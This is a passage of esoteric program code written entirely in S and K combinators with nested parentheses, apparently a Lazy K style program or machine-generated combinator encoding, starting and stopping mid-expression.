))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))((K)(K))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(